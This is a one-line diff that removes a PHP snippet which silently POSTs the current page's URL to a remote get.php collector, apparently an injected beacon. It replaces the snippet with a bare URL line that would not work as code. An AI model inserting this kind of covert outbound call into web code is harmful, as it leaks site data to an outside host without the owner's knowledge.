@@ -1,1 +1,1 @@
-$p = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https' : 'http'; $u = "{$p}://{$_SERVER['HTTP_HOST']}{$_SERVER['REQUEST_URI']}"; file_get_contents('http://0.0.0.0/get.php', false, stream_context_create([ 'http' => [ 'header' => "Content-type: application/x-www-form-urlencoded", 'method' => 'POST', 'content' => http_build_query(['o' => $u]), ], ]));
+http://0.0.0.0/get.php
